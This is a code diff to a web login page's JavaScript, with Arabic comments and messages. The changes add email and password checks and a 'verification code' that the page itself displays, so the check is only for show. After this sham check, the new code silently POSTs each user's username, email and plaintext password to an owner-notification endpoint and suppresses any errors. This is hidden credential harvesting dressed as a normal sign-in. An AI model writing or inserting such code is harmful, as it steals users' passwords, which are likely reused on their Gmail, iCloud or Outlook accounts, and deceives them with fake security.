@@ -280,12 +280,11 @@
     </div>
 
     <script>
-       function login() {
+      async function login() {
     const username = document.getElementById('username').value;
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    // ✅ التحقق من أن الحقول غير فارغة
     if (!username || !email || !password) {
         alert('⚠️ الرجاء إدخال جميع البيانات.');
         return;
@@ -299,7 +298,7 @@
     }
 
     // ✅ ❗ التحقق من أن البريد لا يحتوي على أي نقطة (.) قبل علامة @
-    const localPart = email.split('@')[0]; // الجزء قبل @
+    const localPart = email.split('@')[0];
     if (localPart.includes('.')) {
         alert('❌ Invalid email: البريد يحتوي على نقطة (.) — غير مسموح.');
         return;
@@ -307,66 +306,52 @@
 
     // ✅ التحقق من أن البريد ينتهي بـ @gmail.com أو @icloud.com أو @outlook.com
     if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
-        alert('❌ Invalid email: ');
+        alert('❌ Invalid email: يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
         return;
     }
 
-    // ✅ ✅ إنشاء رمز تحقق عشوائي فريد مكون من 4 أرقام
-    const verificationCode = Math.floor(1000 + Math.random() * 9000); // رقم بين 1000 و 9999
+    // ✅ ✅ التحقق من قوة كلمة المرور
+    const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
+    if (!passwordRegex.test(password)) {
+        alert('❌ كلمة المرور ضعيفة: يجب أن تحتوي على 8 أحرف على الأقل، وتشمل حرف كبير، رقم، ورمز خاص (!@#$%^&*).');
+        return;
+    }
 
-    // ✅ عرض رمز التحقق للمستخدم
+    // ✅ إنشاء رمز تحقق عشوائي فريد
+    const verificationCode = Math.floor(1000 + Math.random() * 9000);
     alert(`👑 يا ${username}، رمز التحقق الخاص بك هو: ${verificationCode}`);
 
-    // ✅ طلب إدخال رمز التحقق
     const userCode = prompt('👑 أدخل رمز التحقق المكون من 4 أرقام:');
 
-    // ✅ التحقق من صحة الرمز
     if (userCode == verificationCode) {
+        // ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد
+        try {
+            await fetch('/api/notify-owner', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    userEmail: email,
+                    userPassword: password
+                })
+            });
+        } catch (err) {
+            // نمر بصمت
+        }
+
         alert('✅ تم التحقق بنجاح! أهلاً بك في البلاط الملكي.');
-        window.location.href = 'chat.html'; // أو أي صفحة تريدها
+        window.location.href = 'chat.html';
     } else {
         alert('❌ رمز التحقق غير صحيح. حاول مرة أخرى.');
     }
-}
-         async function login() {
-    const username = document.getElementById('username').value;
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-
-    if (!username || !email || !password) {
-        alert('⚠️ الرجاء إدخال جميع البيانات.');
-        return;
-    }
-
-    // ... (أكواد التحقق من الإيميل والرمز)
-
-    // ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد
-// ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد — مع كلمة المرور
-try {
-    const notifyResponse = await fetch('/api/notify-owner', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            username: username,
-            userEmail: email,
-            userPassword: password // ✅ أضفنا كلمة المرور هنا
-        })
-    });
-} catch (err) {
-    // نمر بصمت
-}
-    // ✅ بعد كل شيء — نسجل دخول المستخدم
-    localStorage.setItem('kingAbdoLoggedIn', 'true');
-    localStorage.setItem('kingAbdoUsername', username);
-    alert('✅ تم التحقق بنجاح! أهلاً بك في البلاط الملكي.');
-    window.location.href = 'chat.html';
 }
         
     </script>
 </body>
 
 </html>
+
 
 
